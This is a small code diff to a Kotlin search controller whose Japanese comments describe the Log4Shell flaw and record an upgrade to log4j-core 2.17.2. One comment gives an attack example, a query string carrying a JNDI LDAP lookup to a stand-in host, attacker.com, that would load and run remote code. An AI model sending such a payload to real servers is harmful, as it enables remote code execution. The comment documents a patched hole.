@@ -13,8 +13,7 @@ class SearchController {
     // log4j-core 2.14.1 はユーザー入力中の ${jndi:ldap://...} を評価する。
     // 攻撃例: GET /api/search?query=${jndi:ldap://attacker.com/exploit}
     //         → 攻撃者の LDAP サーバーへ接続し任意クラスをロード・実行。
-    // 修正: log4j-core 2.15.0 以上にアップグレード、または
-    //       -Dlog4j2.formatMsgNoLookups=true を設定。
+    // 修正: build.gradle.kts で log4j-core 2.17.2 にアップグレード済み。
     @GetMapping
     fun search(@RequestParam query: String): Map<String, Any> {
         logger.info("Search query received: {}", query)
